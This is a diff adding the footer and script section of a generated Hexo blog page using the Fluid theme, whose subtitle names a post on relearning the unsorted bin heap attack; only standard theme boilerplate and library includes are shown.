+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "Unsorted\_Bin\_Attack再学习&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "left",
+      visible: "hover",
+      
+      icon: "#"
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+</body>
+</html>
